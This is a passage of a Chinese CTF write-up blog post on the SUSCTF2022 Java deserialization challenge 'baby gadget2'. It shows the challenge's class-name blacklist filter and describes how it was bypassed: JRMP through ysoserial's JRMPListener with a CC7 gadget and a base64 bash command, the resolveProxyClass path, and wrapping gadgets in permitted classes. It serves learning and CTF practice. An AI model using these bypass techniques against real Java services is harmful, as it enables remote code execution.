+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> blacklist <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"java.util.Hashtable"</span><span class="token punctuation">,</span> <span class="token string">"java.util.HashSet"</span><span class="token punctuation">,</span> <span class="token string">"java.util.HashMap"</span><span class="token punctuation">,</span> <span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">,</span> <span class="token string">"java.util.PriorityQueue"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token function">SafeInputStream</span><span class="token punctuation">(</span>InputStream is<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
+        <span class="token keyword">super</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span>ObjectStreamClass des<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>entry<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>entry <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>des<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>des<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Set"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>des<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"List"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>des<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Map"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>des<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span><span class="token string">"Cannot deserialize "</span> <span class="token operator">+</span> des<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>des<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>然后说了jdk版本8u191，依赖给了CC 3.1<br>就等于是要找一个新的CC触发点</p>
+<p>快进到看flag。flag的意思是找一个jdk的新触发点。显然不会，再来看看当初这个题是怎么被各队非预期的</p>
+<h3 id="简单非预期"><a href="#简单非预期" class="headerlink" title="简单非预期"></a>简单非预期</h3><p>绝大多数队都是说用jrmp直接打通的。。。确实黑名单里面没有包含这个来着<br>回忆一下jrmp是怎么打的来着</p>
+<p>就是打的RMI，分Client和Listener两种，Client是攻击者起一个服务让受害者连，Listener是受害者起一个服务攻击者打。这里显然得用Client反连。这个攻击的意义和直接反序列化的差距应该就在于多套了一层，这样子就能过一些过滤。比如这里的这堆waf</p>
+<p>当然，实际的的绕过意义应该是绕过8u121之后加的JEP290（对RMI中registry在bind的时候被bind恶意对象反序列化的限制，把允许反序列化的类加了白名单，但是实际上对client和server无效，谁知道server和client通信要用什么类，这整个白名单就没法用了），但是我印象里好像再高一点的版本默认不允许localhost以外的机器bind了？（好像是8u141)努力回忆学过的知识ing。。。。</p>
+<p>直接yso启动就行。。。但是我好像不是很会yso的exploit模块用法。。。。以前都是<code>java -jar</code>直接输出payload的</p>
+<p>exploit模块里面的功能要用<code>java -cp</code>直接指定完全类名，这里是<code>java -cp ysoserial.exploit.JRMPListener</code></p>
+<p>然后随便挑个CC7打过去就行了，懒得魔改yso，直接用那个bash -c究极base64打法打的</p>
+<h3 id="revenge再次被非预期"><a href="#revenge再次被非预期" class="headerlink" title="revenge再次被非预期"></a>revenge再次被非预期</h3><p>revenge之后对类名进行了限定，在resolveClass中添加了需要类名包含javax的限制。</p>
+<p>我一开始还以为这样子就能拦住jrmp了，结果告诉我jrmp发过来的是代理类对象，走的不是resolveClass，而是resolveProxyClass。。。真是闻所未闻，是我浅薄了。找到了一个分析文章（每次都是找文章而不是自己动手。。可能学习效果并不是很好）<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://forum.90sec.com/t/topic/599">Java反序列化过程深究</a></p>
+<p>readObject大概是这么个调用栈</p>
+<pre><code>readObject()
+    readObject0()
+        readOrdinaryObject()
+            readClassDesc()
+            switch(tc)
+                readNoneProxyDesc()
+                    resolveClass()
+                        Class.forName()
+                readProxyDesc()
+                    resolveProxyClass()
+                        Proxy.getProxyClass()
+</code></pre>
+<p>这里会根据反序列化的class的类型在switch处决定进哪个函数，代理类并不会被resolveClass处理，而是有一个单独的resolveProxyClass，导致jrmp并不受新加限制的影响，再次绕过。。。</p>
+<p>说起来可能出题人当时也没意识到应该是用resolveProxyClass来防所以又被非预期了。。。</p>
+<h3 id="三叶草的非预期"><a href="#三叶草的非预期" class="headerlink" title="三叶草的非预期"></a>三叶草的非预期</h3><p>看了很多wp，但是大伙好像都不是什么预期解。。。三叶草的师傅虽然不是jrmp的非预期，但整体上也不算是预期。。。但又有那么一点预期的感觉。总之就是tql</p>
+<p>主要是原因可能是因为他们完全的还原了ASM代码，像我这种大概看懂了在干什么的可能就不会继续看了。。。（因为也不怎么看得懂）</p>
+<p>因为只有在entry处会进行一次类的检验，因此只需要随便整个什么可以反序列化且有一个成员变量能接受反序列化payload就行（比如类型直接是Object）<br>反正会递归的readObject，开头过了后面就是裸的反序列化</p>
+<p>普通版他们直接整了个ConstantTransformer，直接接受Object类对象。</p>
+<p>然后revenge加了个javax的限制之后就从javax里面找了个Attribute类，也有一个成员变量的类型是Object</p>
+<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>从flag内容上能看出来，就是希望能找到一个全新的反序列化入口。这需要对CC链有一定的熟练度。。。。我不太会呜呜，并且怎么找呢</p>
+<p>躺会，我是垃圾哈哈哈</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/SUSCTF2022%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0.html" rel="prev" title="SUSCTF2022 出题笔记">
+      <i class="fa fa-chevron-left"></i> SUSCTF2022 出题笔记
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SUSCTF2022-java%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">SUSCTF2022 java复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-gadget1-amp-revenge"><span class="nav-number">1.1.</span> <span class="nav-text">baby gadget1 &amp; revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">1.1.1.</span> <span class="nav-text">简单的非预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#revenge%E7%9A%84%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">1.1.2.</span> <span class="nav-text">revenge的非预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#openrasp%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.3.</span> <span class="nav-text">openrasp绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">1.1.4.</span> <span class="nav-text">预期解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%93%E4%B8%80%E4%B8%8Btomcat-EL"><span class="nav-number">1.1.5.</span> <span class="nav-text">打一下tomcat EL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-gadget2-amp-revenge"><span class="nav-number">1.2.</span> <span class="nav-text">baby gadget2 &amp; revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">1.2.1.</span> <span class="nav-text">XXE文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">1.2.2.</span> <span class="nav-text">简单非预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#revenge%E5%86%8D%E6%AC%A1%E8%A2%AB%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">1.2.3.</span> <span class="nav-text">revenge再次被非预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E5%8F%B6%E8%8D%89%E7%9A%84%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">1.2.4.</span> <span class="nav-text">三叶草的非预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F"><span class="nav-number">1.2.5.</span> <span class="nav-text">预期</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
